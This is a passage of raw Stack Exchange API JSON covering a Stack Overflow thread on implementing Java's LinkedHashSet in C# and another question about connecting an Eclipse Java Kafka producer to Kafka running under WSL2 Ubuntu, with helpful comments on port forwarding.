{\r\n    \t\tthis.dict = new Dictionary&lt;T,LinkedListNode&lt;T&gt;&gt;(initialCapacity);\r\n    \t\tthis.list = new LinkedList&lt;T&gt;();\r\n    \t}\r\n    \r\n    \tpublic LinkedHashSet() {\r\n    \t\tthis.dict = new Dictionary&lt;T,LinkedListNode&lt;T&gt;&gt;();\r\n    \t\tthis.list = new LinkedList&lt;T&gt;();\r\n    \t}\r\n    \r\n    \tpublic LinkedHashSet(IEnumerable&lt;T&gt; e) : this() {\r\n    \t\taddEnumerable(e);\r\n    \t}\r\n    \r\n    \tpublic LinkedHashSet(int initialCapacity, IEnumerable&lt;T&gt; e) : this(initialCapacity) {\r\n    \t\taddEnumerable(e);\r\n    \t}\r\n    \r\n    \tprivate void addEnumerable(IEnumerable&lt;T&gt; e) {\r\n    \t\tforeach (T t in e) {\r\n    \t\t\tAdd(t);\r\n    \t\t}\r\n    \t}\r\n    \r\n    \t//\r\n    \t// ISet implementation\r\n    \t//\r\n    \r\n    \tpublic bool Add(T item) {\r\n    \t\tif (this.dict.ContainsKey(item)) {\r\n    \t\t\treturn false;\r\n    \t\t}\r\n    \t\tLinkedListNode&lt;T&gt; node = this.list.AddLast(item);\r\n    \t\tthis.dict[item] = node;\r\n    \t\treturn true;\r\n    \t}\r\n    \r\n    \tpublic void ExceptWith(IEnumerable&lt;T&gt; other) {\r\n    \t\tif (other == null) {\r\n    \t\t\tthrow new ArgumentNullException(&quot;other cannot be null&quot;);\r\n    \t\t}\r\n    \t\tforeach (T t in other) {\r\n    \t\t\tRemove(t);\r\n    \t\t}\r\n    \t}\r\n    \r\n    \tpublic void IntersectWith(IEnumerable&lt;T&gt; other) {\r\n    \t\tif (other == null) {\r\n    \t\t\tthrow new ArgumentNullException(&quot;other cannot be null&quot;);\r\n    \t\t}\r\n    \t\tT[] ts = new T[Count];\r\n    \t\tCopyTo(ts, 0);\r\n    \t\tforeach (T t in ts) {\r\n    \t\t\tif (!System.Linq.Enumerable.Contains(other, t)) {\r\n    \t\t\t\tRemove(t);\r\n    \t\t\t}\r\n    \t\t}\r\n    \t}\r\n    \r\n    \tpublic bool IsProperSubsetOf(IEnumerable&lt;T&gt; other) {\r\n    \t\tif (other == null) {\r\n    \t\t\tthrow new ArgumentNullException(&quot;other cannot be null&quot;);\r\n    \t\t}\r\n    \t\tint contains = 0;\r\n    \t\tint noContains = 0;\r\n    \t\tforeach (T t in other) {\r\n    \t\t\tif (Contains(t)) {\r\n    \t\t\t\tcontains++;\r\n    \t\t\t} else {\r\n    \t\t\t\tnoContains++;\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\treturn contains == Count &amp;&amp; noContains &gt; 0;\r\n    \t}\r\n    \r\n    \tpublic bool IsProperSupersetOf(IEnumerable&lt;T&gt; other) {\r\n    \t\tif (other == null) {\r\n    \t\t\tthrow new ArgumentNullException(&quot;other cannot be null&quot;);\r\n    \t\t}\r\n    \t\tint otherCount = System.Linq.Enumerable.Count(other);\r\n    \t\tif (Count &lt;= otherCount) {\r\n    \t\t\treturn false;\r\n    \t\t}\r\n    \t\tint contains = 0;\r\n    \t\tint noContains = 0;\r\n    \t\tforeach (T t in this) {\r\n    \t\t\tif (System.Linq.Enumerable.Contains(other, t)) {\r\n    \t\t\t\tcontains++;\r\n    \t\t\t} else {\r\n    \t\t\t\tnoContains++;\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\treturn contains == otherCount &amp;&amp; noContains &gt; 0;\r\n    \t}\r\n    \r\n    \tpublic bool IsSubsetOf(IEnumerable&lt;T&gt; other) {\r\n    \t\tif (other == null) {\r\n    \t\t\tthrow new ArgumentNullException(&quot;other cannot be null&quot;);\r\n    \t\t}\r\n    \t\tforeach (T t in this) {\r\n    \t\t\tif (!System.Linq.Enumerable.Contains(other, t)) {\r\n    \t\t\t\treturn false;\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\treturn true;\r\n    \t}\r\n    \r\n    \tpublic bool IsSupersetOf(IEnumerable&lt;T&gt; other) {\r\n    \t\tif (other == null) {\r\n    \t\t\tthrow new ArgumentNullException(&quot;other cannot be null&quot;);\r\n    \t\t}\r\n    \t\tforeach (T t in other) {\r\n    \t\t\tif (!Contains(t)) {\r\n    \t\t\t\treturn false;\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\treturn true;\r\n    \t}\r\n    \r\n    \tpublic bool Overlaps(IEnumerable&lt;T&gt; other) {\r\n    \t\tif (other == null) {\r\n    \t\t\tthrow new ArgumentNullException(&quot;other cannot be null&quot;);\r\n    \t\t}\r\n    \t\tforeach (T t in other) {\r\n    \t\t\tif (Contains(t)) {\r\n    \t\t\t\treturn true;\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\treturn false;\r\n    \t}\r\n    \r\n    \tpublic bool SetEquals(IEnumerable&lt;T&gt; other) {\r\n    \t\tif (other == null) {\r\n    \t\t\tthrow new ArgumentNullException(&quot;other cannot be null&quot;);\r\n    \t\t}\r\n    \t\tint otherCount = System.Linq.Enumerable.Count(other);\r\n    \t\tif (Count != otherCount) {\r\n    \t\t\treturn false;\r\n    \t\t}\r\n    \t\treturn IsSupersetOf(other);\r\n    \t}\r\n    \r\n    \tpublic void SymmetricExceptWith(IEnumerable&lt;T&gt; other) {\r\n    \t\tif (other == null) {\r\n    \t\t\tthrow new ArgumentNullException(&quot;other cannot be null&quot;);\r\n    \t\t}\r\n    \t\tT[] ts = new T[Count];\r\n    \t\tCopyTo(ts, 0);\r\n    \t\tHashSet&lt;T&gt; otherList = new HashSet&lt;T&gt;(other);\r\n    \t\tforeach (T t in ts) {\r\n    \t\t\tif (otherList.Contains(t)) {\r\n    \t\t\t\tRemove(t);\r\n    \t\t\t\totherList.Remove(t);\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\tforeach (T t in otherList) {\r\n    \t\t\tAdd(t);\r\n    \t\t}\r\n    \t}\r\n    \r\n    \tpublic void UnionWith(IEnumerable&lt;T&gt; other) {\r\n    \t\tif (other == null) {\r\n    \t\t\tthrow new ArgumentNullException(&quot;other cannot be null&quot;);\r\n    \t\t}\r\n    \t\tforeach (T t in other) {\r\n    \t\t\tAdd(t);\r\n    \t\t}\r\n    \t}\r\n    \r\n    \t//\r\n    \t// ICollection&lt;T&gt; implementation\r\n    \t//\r\n    \r\n    \tpublic int Count {\r\n    \t\tget {\r\n    \t\t\treturn this.dict.Count;\r\n    \t\t}\r\n    \t}\r\n    \r\n    \tpublic bool IsReadOnly {\r\n    \t\tget {\r\n    \t\t\treturn this.dict.IsReadOnly;\r\n    \t\t}\r\n    \t}\r\n    \r\n    \tvoid ICollection&lt;T&gt;.Add(T item) {\r\n    \t\tAdd(item);\r\n    \t}\r\n    \r\n    \tpublic void Clear() {\r\n    \t\tthis.dict.Clear();\r\n    \t\tthis.list.Clear();\r\n    \t}\r\n    \r\n    \tpublic bool Contains(T item) {\r\n    \t\treturn this.dict.ContainsKey(item);\r\n    \t}\r\n    \r\n    \tpublic void CopyTo(T[] array, int arrayIndex) {\r\n    \t\tthis.list.CopyTo(array, arrayIndex);\r\n    \t}\r\n    \r\n    \tpublic bool Remove(T item) {\r\n    \t\tLinkedListNode&lt;T&gt; node;\r\n    \t\tif (!this.dict.TryGetValue(item, out node)) {\r\n    \t\t\treturn false;\r\n    \t\t}\r\n    \t\tthis.dict.Remove(item);\r\n    \t\tthis.list.Remove(node);\r\n    \t\treturn true;\r\n    \t}\r\n    \r\n    \t//\r\n    \t// IEnumerable&lt;T&gt; implementation\r\n    \t//\r\n    \r\n    \tpublic IEnumerator&lt;T&gt; GetEnumerator() {\r\n    \t\treturn this.list.GetEnumerator();\r\n    \t}\r\n    \r\n    \t//\r\n    \t// IEnumerable implementation\r\n    \t//\r\n    \r\n    \tIEnumerator IEnumerable.GetEnumerator() {\r\n    \t\treturn this.list.GetEnumerator();\r\n    \t}\r\n    \r\n    }\r\n\r\nRequired usings:\r\n\r\n    using System;\r\n    using System.Collections;\r\n    using System.Collections.Generic;\r\n\r\nWarning: The class is largely untested, especially the ISet methods. Use at your own risk.&lt;br&gt;\r\nI hope someone finds this useful. :)","title":"What is the equivalent of LinkedHashSet (Java) in C#?","body":"<p>I completed the unfinished methods and generally polished the class that 'achitaka-san' posted.</p>\n\n<pre><code>public class LinkedHashSet&lt;T&gt; : ISet&lt;T&gt; {\n\n    private readonly IDictionary&lt;T, LinkedListNode&lt;T&gt;&gt; dict;\n    private readonly LinkedList&lt;T&gt; list;\n\n    public LinkedHashSet(int initialCapacity) {\n        this.dict = new Dictionary&lt;T,LinkedListNode&lt;T&gt;&gt;(initialCapacity);\n        this.list = new LinkedList&lt;T&gt;();\n    }\n\n    public LinkedHashSet() {\n        this.dict = new Dictionary&lt;T,LinkedListNode&lt;T&gt;&gt;();\n        this.list = new LinkedList&lt;T&gt;();\n    }\n\n    public LinkedHashSet(IEnumerable&lt;T&gt; e) : this() {\n        addEnumerable(e);\n    }\n\n    public LinkedHashSet(int initialCapacity, IEnumerable&lt;T&gt; e) : this(initialCapacity) {\n        addEnumerable(e);\n    }\n\n    private void addEnumerable(IEnumerable&lt;T&gt; e) {\n        foreach (T t in e) {\n            Add(t);\n        }\n    }\n\n    //\n    // ISet implementation\n    //\n\n    public bool Add(T item) {\n        if (this.dict.ContainsKey(item)) {\n            return false;\n        }\n        LinkedListNode&lt;T&gt; node = this.list.AddLast(item);\n        this.dict[item] = node;\n        return true;\n    }\n\n    public void ExceptWith(IEnumerable&lt;T&gt; other) {\n        if (other == null) {\n            throw new ArgumentNullException(\"other cannot be null\");\n        }\n        foreach (T t in other) {\n            Remove(t);\n        }\n    }\n\n    public void IntersectWith(IEnumerable&lt;T&gt; other) {\n        if (other == null) {\n            throw new ArgumentNullException(\"other cannot be null\");\n        }\n        T[] ts = new T[Count];\n        CopyTo(ts, 0);\n        foreach (T t in ts) {\n            if (!System.Linq.Enumerable.Contains(other, t)) {\n                Remove(t);\n            }\n        }\n    }\n\n    public bool IsProperSubsetOf(IEnumerable&lt;T&gt; other) {\n        if (other == null) {\n            throw new ArgumentNullException(\"other cannot be null\");\n        }\n        int contains = 0;\n        int noContains = 0;\n        foreach (T t in other) {\n            if (Contains(t)) {\n                contains++;\n            } else {\n                noContains++;\n            }\n        }\n        return contains == Count &amp;&amp; noContains &gt; 0;\n    }\n\n    public bool IsProperSupersetOf(IEnumerable&lt;T&gt; other) {\n        if (other == null) {\n            throw new ArgumentNullException(\"other cannot be null\");\n        }\n        int otherCount = System.Linq.Enumerable.Count(other);\n        if (Count &lt;= otherCount) {\n            return false;\n        }\n        int contains = 0;\n        int noContains = 0;\n        foreach (T t in this) {\n            if (System.Linq.Enumerable.Contains(other, t)) {\n                contains++;\n            } else {\n                noContains++;\n            }\n        }\n        return contains == otherCount &amp;&amp; noContains &gt; 0;\n    }\n\n    public bool IsSubsetOf(IEnumerable&lt;T&gt; other) {\n        if (other == null) {\n            throw new ArgumentNullException(\"other cannot be null\");\n        }\n        foreach (T t in this) {\n            if (!System.Linq.Enumerable.Contains(other, t)) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public bool IsSupersetOf(IEnumerable&lt;T&gt; other) {\n        if (other == null) {\n            throw new ArgumentNullException(\"other cannot be null\");\n        }\n        foreach (T t in other) {\n            if (!Contains(t)) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public bool Overlaps(IEnumerable&lt;T&gt; other) {\n        if (other == null) {\n            throw new ArgumentNullException(\"other cannot be null\");\n        }\n        foreach (T t in other) {\n            if (Contains(t)) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    public bool SetEquals(IEnumerable&lt;T&gt; other) {\n        if (other == null) {\n            throw new ArgumentNullException(\"other cannot be null\");\n        }\n        int otherCount = System.Linq.Enumerable.Count(other);\n        if (Count != otherCount) {\n            return false;\n        }\n        return IsSupersetOf(other);\n    }\n\n    public void SymmetricExceptWith(IEnumerable&lt;T&gt; other) {\n        if (other == null) {\n            throw new ArgumentNullException(\"other cannot be null\");\n        }\n        T[] ts = new T[Count];\n        CopyTo(ts, 0);\n        HashSet&lt;T&gt; otherList = new HashSet&lt;T&gt;(other);\n        foreach (T t in ts) {\n            if (otherList.Contains(t)) {\n                Remove(t);\n                otherList.Remove(t);\n            }\n        }\n        foreach (T t in otherList) {\n            Add(t);\n        }\n    }\n\n    public void UnionWith(IEnumerable&lt;T&gt; other) {\n        if (other == null) {\n            throw new ArgumentNullException(\"other cannot be null\");\n        }\n        foreach (T t in other) {\n            Add(t);\n        }\n    }\n\n    //\n    // ICollection&lt;T&gt; implementation\n    //\n\n    public int Count {\n        get {\n            return this.dict.Count;\n        }\n    }\n\n    public bool IsReadOnly {\n        get {\n            return this.dict.IsReadOnly;\n        }\n    }\n\n    void ICollection&lt;T&gt;.Add(T item) {\n        Add(item);\n    }\n\n    public void Clear() {\n        this.dict.Clear();\n        this.list.Clear();\n    }\n\n    public bool Contains(T item) {\n        return this.dict.ContainsKey(item);\n    }\n\n    public void CopyTo(T[] array, int arrayIndex) {\n        this.list.CopyTo(array, arrayIndex);\n    }\n\n    public bool Remove(T item) {\n        LinkedListNode&lt;T&gt; node;\n        if (!this.dict.TryGetValue(item, out node)) {\n            return false;\n        }\n        this.dict.Remove(item);\n        this.list.Remove(node);\n        return true;\n    }\n\n    //\n    // IEnumerable&lt;T&gt; implementation\n    //\n\n    public IEnumerator&lt;T&gt; GetEnumerator() {\n        return this.list.GetEnumerator();\n    }\n\n    //\n    // IEnumerable implementation\n    //\n\n    IEnumerator IEnumerable.GetEnumerator() {\n        return this.list.GetEnumerator();\n    }\n\n}\n</code></pre>\n\n<p>Required usings:</p>\n\n<pre><code>using System;\nusing System.Collections;\nusing System.Collections.Generic;\n</code></pre>\n\n<p>Warning: The class is largely untested, especially the ISet methods. Use at your own risk.<br>\nI hope someone finds this useful. :)</p>\n"},{"tags":[],"owner":{"account_id":1240361,"reputation":528,"user_id":1203126,"display_name":"slartibartfast"},"down_vote_count":3,"up_vote_count":14,"is_accepted":false,"score":11,"last_activity_date":1484082847,"creation_date":1484082847,"answer_id":41578530,"question_id":9346526,"body_markdown":"HashSet does the job because it is virtually equivalent to LinkedHashSet in Java. HashSet is backed by a linked list - though the docs don&#39;t explicitly state that it preserves the order or that it is backed by a array-based linked list. You can see from [the source code][1] the implementation is a LinkedHashSet.\r\n\r\n\r\nDuplicates are not allowed just like the Java LinkedHashSet. The one difference between this and LinkedHashSet is that if you remove something from the set, it only marks the element as free in the array, and so adding an item after a remove() fills up the empty array slots first before “appending”. The way around this is to call the TrimExcess() method. So, while it is not exactly the same in many use cases, e.g. serialize and deserialize and for effectively immutable sets once created it works great.\r\n\r\nYou can always subclass and override remove() to always call TrimExcess() to get the same behavior. And you can name the class LinkedHashSet for clarity!\r\n\r\n    using System;\r\n    using System.Collections.Generic;\r\n    \r\n    \r\n    namespace ConsoleApplication\r\n    {\r\n        public class Program\r\n        {\r\n            public static void Main(string[] args)\r\n            {\r\n                String[] crew = {&quot;Spock&quot;, &quot;Kirk&quot;, &quot;Bones&quot;, &quot;Picard&quot;, &quot;Uhura&quot;, &quot;Chekov&quot;};\r\n                HashSet&lt;String&gt; linkedHashSet = new HashSet&lt;String&gt;(crew);\r\n    \r\n                // Show order is preserved\r\n                foreach(String value in linkedHashSet){\r\n                    Console.Write(value); Console.Write(&quot; &quot;);\r\n                }\r\n    \r\n                // Remove from the middle\r\n                linkedHashSet.Remove(&quot;Picard&quot;);\r\n                Console.WriteLine();\r\n                foreach(String value in linkedHashSet){\r\n                    Console.Write(value); Console.Write(&quot; &quot;);\r\n                }\r\n    \r\n                // Add it back but it is back in the middle not the end\r\n                linkedHashSet.Add(&quot;Picard&quot;);\r\n                Console.WriteLine();\r\n                foreach(String value in linkedHashSet){\r\n                    Console.Write(value); Console.Write(&quot; &quot;);\r\n                }\r\n    \r\n                // Remove and trim then add\r\n                linkedHashSet.Remove(&quot;Picard&quot;);\r\n                linkedHashSet.TrimExcess();\r\n                linkedHashSet.Add(&quot;Picard&quot;);\r\n                Console.WriteLine();\r\n                foreach(String value in linkedHashSet){\r\n                    Console.Write(value); Console.Write(&quot; &quot;);\r\n                }\r\n                Console.WriteLine();\r\n            }\r\n        }\r\n    }\r\n\r\nOutput:\r\n\r\n    Spock Kirk Bones Picard Uhura Chekov\r\n    Spock Kirk Bones Uhura Chekov\r\n    Spock Kirk Bones Picard Uhura Chekov\r\n    Spock Kirk Bones Uhura Chekov Picard\r\n\r\n  [1]: https://referencesource.microsoft.com/#system.core/System/Collections/Generic/HashSet.cs,1432","title":"What is the equivalent of LinkedHashSet (Java) in C#?","body":"<p>HashSet does the job because it is virtually equivalent to LinkedHashSet in Java. HashSet is backed by a linked list - though the docs don't explicitly state that it preserves the order or that it is backed by a array-based linked list. You can see from <a href=\"https://referencesource.microsoft.com/#system.core/System/Collections/Generic/HashSet.cs,1432\" rel=\"noreferrer\">the source code</a> the implementation is a LinkedHashSet.</p>\n\n<p>Duplicates are not allowed just like the Java LinkedHashSet. The one difference between this and LinkedHashSet is that if you remove something from the set, it only marks the element as free in the array, and so adding an item after a remove() fills up the empty array slots first before “appending”. The way around this is to call the TrimExcess() method. So, while it is not exactly the same in many use cases, e.g. serialize and deserialize and for effectively immutable sets once created it works great.</p>\n\n<p>You can always subclass and override remove() to always call TrimExcess() to get the same behavior. And you can name the class LinkedHashSet for clarity!</p>\n\n<pre><code>using System;\nusing System.Collections.Generic;\n\n\nnamespace ConsoleApplication\n{\n    public class Program\n    {\n        public static void Main(string[] args)\n        {\n            String[] crew = {\"Spock\", \"Kirk\", \"Bones\", \"Picard\", \"Uhura\", \"Chekov\"};\n            HashSet&lt;String&gt; linkedHashSet = new HashSet&lt;String&gt;(crew);\n\n            // Show order is preserved\n            foreach(String value in linkedHashSet){\n                Console.Write(value); Console.Write(\" \");\n            }\n\n            // Remove from the middle\n            linkedHashSet.Remove(\"Picard\");\n            Console.WriteLine();\n            foreach(String value in linkedHashSet){\n                Console.Write(value); Console.Write(\" \");\n            }\n\n            // Add it back but it is back in the middle not the end\n            linkedHashSet.Add(\"Picard\");\n            Console.WriteLine();\n            foreach(String value in linkedHashSet){\n                Console.Write(value); Console.Write(\" \");\n            }\n\n            // Remove and trim then add\n            linkedHashSet.Remove(\"Picard\");\n            linkedHashSet.TrimExcess();\n            linkedHashSet.Add(\"Picard\");\n            Console.WriteLine();\n            foreach(String value in linkedHashSet){\n                Console.Write(value); Console.Write(\" \");\n            }\n            Console.WriteLine();\n        }\n    }\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Spock Kirk Bones Picard Uhura Chekov\nSpock Kirk Bones Uhura Chekov\nSpock Kirk Bones Picard Uhura Chekov\nSpock Kirk Bones Uhura Chekov Picard\n</code></pre>\n"}],"owner":{"account_id":881880,"reputation":8346,"user_id":270143,"accept_rate":88,"display_name":"ycomp"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":12576,"favorite_count":0,"down_vote_count":1,"up_vote_count":22,"accepted_answer_id":31419199,"answer_count":4,"score":21,"last_activity_date":1639580286,"creation_date":1329623533,"question_id":9346526,"body_markdown":"What is the equivalent of a LinkedHashSet (Java) in C#?","title":"What is the equivalent of LinkedHashSet (Java) in C#?","body":"<p>What is the equivalent of a LinkedHashSet (Java) in C#?</p>\n"},{"tags":["java","apache-kafka","wsl-2"],"comments":[{"owner":{"account_id":6875395,"reputation":1037,"user_id":5284011,"display_name":"JohnXF"},"score":0,"creation_date":1639578519,"post_id":70362362,"comment_id":124384778,"body_markdown":"It sounds like you have two physical separate machines - a windows and a ubuntu one? Outside of eclipse (at the windows command prompt) prove you have connectivity to the Kafka running on the ubuntu box. Start showing you can ping it (resolve the name, etc) and then use CURL or something to check you can hit the Kafka application itself. Your java code also seems to define ``localhost:9092`` as the ``bootstrap.servers`` value. But the kafka on 9092 is on the ubuntu server, not localhost?","body":"It sounds like you have two physical separate machines - a windows and a ubuntu one? Outside of eclipse (at the windows command prompt) prove you have connectivity to the Kafka running on the ubuntu box. Start showing you can ping it (resolve the name, etc) and then use CURL or something to check you can hit the Kafka application itself. Your java code also seems to define <code>localhost:9092</code> as the <code>bootstrap.servers</code> value. But the kafka on 9092 is on the ubuntu server, not localhost?"},{"owner":{"account_id":1969960,"reputation":2164,"user_id":1769197,"accept_rate":50,"display_name":"user1769197"},"score":0,"creation_date":1639578824,"post_id":70362362,"comment_id":124384935,"body_markdown":"hi @JohnXF thanks for your comments. I didn&#39;t really know the ubuntu I installed in Windows is being seens as a separate machine here. In this case, can they be sharing the same IP address ? And I am just very lost here. Can you elaborate on how I can ping it ?","body":"hi @JohnXF thanks for your comments. I didn&#39;t really know the ubuntu I installed in Windows is being seens as a separate machine here. In this case, can they be sharing the same IP address ? And I am just very lost here. Can you elaborate on how I can ping it ?"},{"owner":{"account_id":6875395,"reputation":1037,"user_id":5284011,"display_name":"JohnXF"},"score":1,"creation_date":1639578895,"post_id":70362362,"comment_id":124384976,"body_markdown":"How do you mean the &#39;ubuntu installed in windows&#39;??? Are you talking about a virtual machine or something?","body":"How do you mean the &#39;ubuntu installed in windows&#39;??? Are you talking about a virtual machine or something?"},{"owner":{"account_id":1969960,"reputation":2164,"user_id":1769197,"accept_rate":50,"display_name":"user1769197"},"score":0,"creation_date":1639578980,"post_id":70362362,"comment_id":124385018,"body_markdown":"I mean i followed this link to install Ubuntu in Window. Sorry for the confusion. https://www.confluent.io/blog/set-up-and-run-kafka-on-windows-linux-wsl-2/","body":"I mean i followed this link to install Ubuntu in Window. Sorry for the confusion. <a href=\"https://www.confluent.io/blog/set-up-and-run-kafka-on-windows-linux-wsl-2/\" rel=\"nofollow noreferrer\">confluent.io/blog/set-up-and-run-kafka-on-windows-linux-wsl-&zwnj;&#8203;2</a>"},{"owner":{"account_id":6875395,"reputation":1037,"user_id":5284011,"display_name":"JohnXF"},"score":2,"creation_date":1639579385,"post_id":70362362,"comment_id":124385200,"body_markdown":"Yes, that is quite important information. So the problem sounds like the WSL is not exposing the port to the host (windows machine). You should do some research on that. eg. https://learn.microsoft.com/en-us/windows/wsl/networking and https://dev.to/vishnumohanrk/wsl-port-forwarding-2e22","body":"Yes, that is quite important information. So the problem sounds like the WSL is not exposing the port to the host (windows machine). You should do some research on that. eg. <a href=\"https://learn.microsoft.com/en-us/windows/wsl/networking\" rel=\"nofollow noreferrer\">learn.microsoft.com/en-us/windows/wsl/networking</a> and <a href=\"https://dev.to/vishnumohanrk/wsl-port-forwarding-2e22\" rel=\"nofollow noreferrer\">dev.to/vishnumohanrk/wsl-port-forwarding-2e22</a>"},{"owner":{"account_id":2671330,"reputation":183376,"user_id":2308683,"accept_rate":90,"display_name":"OneCricketeer"},"score":0,"creation_date":1639579407,"post_id":70362362,"comment_id":124385210,"body_markdown":"By default, Kafka doesn&#39;t expose itself outside of the WSL2 hypervisor machine. Plus, you need a port forward","body":"By default, Kafka doesn&#39;t expose itself outside of the WSL2 hypervisor machine. Plus, you need a port forward"},{"owner":{"account_id":2671330,"reputation":183376,"user_id":2308683,"accept_rate":90,"display_name":"OneCricketeer"},"score":1,"creation_date":1639579587,"post_id":70362362,"comment_id":124385286,"body_markdown":"Along with the above Microsoft docs, you&#39;ll want to read this (pretend WSL2 is like Docker) https://www.confluent.io/blog/kafka-listeners-explained/","body":"Along with the above Microsoft docs, you&#39;ll want to read this (pretend WSL2 is like Docker) <a href=\"https://www.confluent.io/blog/kafka-listeners-explained/\" rel=\"nofollow noreferrer\">confluent.io/blog/kafka-listeners-explained</a>"},{"owner":{"account_id":1969960,"reputation":2164,"user_id":1769197,"accept_rate":50,"display_name":"user1769197"},"score":0,"creation_date":1639580197,"post_id":70362362,"comment_id":124385548,"body_markdown":"Thanks all for the generous ideas. I have to say they are a bit technical for me. My understanding is that the Linus server IP address first and then port forward and then also create a kafka listener. Perhaps I should just get confluent kafka and there won&#39;t be issue like these.","body":"Thanks all for the generous ideas. I have to say they are a bit technical for me. My understanding is that the Linus server IP address first and then port forward and then also create a kafka listener. Perhaps I should just get confluent kafka and there won&#39;t be issue like these."},{"owner":{"account_id":2671330,"reputation":183376,"user_id":2308683,"accept_rate":90,"display_name":"OneCricketeer"},"score":1,"creation_date":1639580706,"post_id":70362362,"comment_id":124385775,"body_markdown":"There&#39;s no such thing as &quot;Confluent Kafka&quot; It&#39;s all the same *Apache* Kafka. If you mean pay for Confluent Cloud, then, yes, that&#39;s an alternative that&#39;ll require payment.","body":"There&#39;s no such thing as &quot;Confluent Kafka&quot; It&#39;s all the same <i>Apache</i> Kafka. If you mean pay for Confluent Cloud, then, yes, that&#39;s an alternative that&#39;ll require payment."},{"owner":{"account_id":1969960,"reputation":2164,"user_id":1769197,"accept_rate":50,"display_name":"user1769197"},"score":0,"creation_date":1639580905,"post_id":70362362,"comment_id":124385861,"body_markdown":"thanks for the heads-up. You have been very helpful and knowledgable. Will read the links you recommended above once again to get around the issue then,","body":"thanks for the heads-up. You have been very helpful and knowledgable. Will read the links you recommended above once again to get around the issue then,"}],"owner":{"account_id":1969960,"reputation":2164,"user_id":1769197,"accept_rate":50,"display_name":"user1769197"},"comment_count":10,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":158,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639580260,"creation_date":1639565370,"question_id":70362362,"body_markdown":"I read this [post][1] and I am doing the following in my own single local machine. I am using a Windows machine and just installed Ubuntu. I installed Java 8 on Ubuntu and can run Kafka smoothly. By that, I mean I can open two separate terminals of consumer and producer and they can talk to each other successfully. \r\n\r\nI have also written a Java program in Eclipse and Eclipse points to a **different** JRE. \r\n\r\nHowever, when I run my Java program in Eclipse to produce / consume messages in Kafka, nothing is printed to Ubuntu&#39;s consumer. My Java does not connect to Kafka at all. \r\n\r\nWhat have I done wrong here?\r\n\r\nI notice that when I start the ZooKeeper and Kafka in CMD, I am able to connect my Java Program to Kafka.  However, when I start the ZooKeeper and Kafka in Ubuntu, my Java program can never connect to Kafka server there.\r\n\r\nCommands to start ZooKeeper, Kafka and consumer in Ubuntu:\r\n\r\n    # start zookeeper\r\n    bin/zookeeper-server-start.sh config/zookeeper.properties\r\n    # start kafka \r\n    bin/kafka-server-start.sh config/server.properties\r\n    # create TestTopics\r\n    bin/kafka-topics.sh --zookeeper localhost:2181 --create --replication-factor 1 --partitions 1 --topic TestTopic\r\n    # start consumer\r\n    bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic TestTopic -from-beginning\r\n\r\n\r\n**Java Program in Eclipse**\r\n\r\n    import java.time.LocalDateTime;\r\n    import java.time.ZoneId;\r\n    import java.time.format.DateTimeFormatter;\r\n    import java.util.Properties;\r\n    \r\n    import org.apache.kafka.clients.producer.KafkaProducer;\r\n    import org.apache.kafka.clients.producer.Producer;\r\n    import org.apache.kafka.clients.producer.ProducerRecord;\r\n    \r\n    public class ProducerTesting {\r\n    \r\n    \tpublic static void main(String args[]) {\r\n    \t\t/*\r\n    \t\t *  Producer\r\n    \t\t * \r\n    \t\t * */\r\n    \t\t// properties for producer\r\n    \t\tProperties props = new Properties();\r\n    \t\tprops.put(&quot;bootstrap.servers&quot;,&quot;localhost:9092&quot;);\r\n    \t\tprops.put(&quot;key.serializer&quot;,&quot;org.apache.kafka.common.serialization.IntegerSerializer&quot;);\r\n    \t\tprops.put(&quot;value.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);\r\n    \t\t\r\n    \t\t// create producer\r\n    \t\tProducer&lt;Integer, String&gt; producer = new KafkaProducer&lt;Integer,String&gt;(props);\r\n    \t\t\r\n    \t\t// send messages to my topics\r\n    \t\tfor(int i = 0; i &lt;5; i++) {\r\n    \t\t\tProducerRecord&lt;Integer,String&gt; producerRecord = new ProducerRecord&lt;Integer,String&gt;(&quot;TestTopic&quot;,i,&quot;testing&quot; + LocalDateTime.now().format(DateTimeFormatter.ofPattern(&quot;yyyyMMdd HH:mm:ss&quot;).withZone(ZoneId.of(&quot;Asia/Hong_Kong&quot;))));\r\n    \t\t\tproducer.send(producerRecord);\r\n    \t\t}\r\n    \t\t\r\n    \t\t// close producer\r\n    \t\tproducer.close();\r\n    \t}\r\n    \r\n    }\r\n\r\n\r\n  [1]: https://www.confluent.io/blog/set-up-and-run-kafka-on-windows-linux-wsl-2/","title":"Failed to connect Java program in Windows Eclipse to Kafka in Ubuntu from the same machine, same network?","body":"<p>I read this <a href=\"https://www.confluent.io/blog/set-up-and-run-kafka-on-windows-linux-wsl-2/\" rel=\"nofollow noreferrer\">post</a> and I am doing the following in my own single local machine. I am using a Windows machine and just installed Ubuntu. I installed Java 8 on Ubuntu and can run Kafka smoothly. By that, I mean I can open two separate terminals of consumer and producer and they can talk to each other successfully.</p>\n<p>I have also written a Java program in Eclipse and Eclipse points to a <strong>different</strong> JRE.</p>\n<p>However, when I run my Java program in Eclipse to produce / consume messages in Kafka, nothing is printed to Ubuntu's consumer. My Java does not connect to Kafka at all.</p>\n<p>What have I done wrong here?</p>\n<p>I notice that when I start the ZooKeeper and Kafka in CMD, I am able to connect my Java Program to Kafka.  However, when I start the ZooKeeper and Kafka in Ubuntu, my Java program can never connect to Kafka server there.</p>\n<p>Commands to start ZooKeeper, Kafka and consumer in Ubuntu:</p>\n<pre><code># start zookeeper\nbin/zookeeper-server-start.sh config/zookeeper.properties\n# start kafka \nbin/kafka-server-start.sh config/server.properties\n# create TestTopics\nbin/kafka-topics.sh --zookeeper localhost:2181 --create --replication-factor 1 --partitions 1 --topic TestTopic\n# start consumer\nbin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic TestTopic 